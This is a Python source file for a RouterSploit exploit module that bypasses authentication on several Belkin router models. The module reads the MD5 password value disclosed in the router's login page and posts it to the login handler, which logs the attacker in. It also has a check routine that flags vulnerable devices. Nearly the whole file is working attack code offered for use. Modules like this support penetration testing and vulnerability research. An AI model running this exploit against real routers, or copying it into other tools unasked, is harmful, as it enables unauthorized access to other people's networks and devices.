import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Authentication bypass using MD5 password disclosure.
    If the target is vulnerable, your computer is automatically authenticated.
    """
    __info__ = {
        'name': 'Belkin Auth Bypass',
        'description': 'Module exploits Belkin authentication using MD5 password disclosure',
        'authors': [
            'Gregory Smiley <gsx0r.sec[at]gmail.com>',  # vulnerability discovery
            'BigNerd95 (Lorenzo Santina)',  # improved exploit and routersploit module
        ],
        'references': [
            'https://securityevaluators.com/knowledge/case_studies/routers/belkin_n900.php',
            'https://www.exploit-db.com/exploits/40081/',
        ],
        'devices': [
            'Belkin Play Max (F7D4401)',
            'Belkin F5D8633',
            'Belkin N900 (F9K1104)',
            'Belkin N300 (F7D7301)',
            'Belkin AC1200',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        url = "{}:{}/login.stm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        val = re.findall('password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            url = "{}:{}/login.cgi".format(self.target, self.port)
            payload = "pws=" + val[0] + "&arc_action=login&action=Submit"

            login = http_request(method="POST", url=url, data=payload)
            if login is None:
                return

            error = re.search('loginpserr.stm', login.text)

            if not error:
                print_success("Exploit success, you are now logged in!")
                return

        print_error("Exploit failed. Device seems to be not vulnerable.")

    @mute
    def check(self):
        url = "{}:{}/login.stm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        val = re.findall('password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable
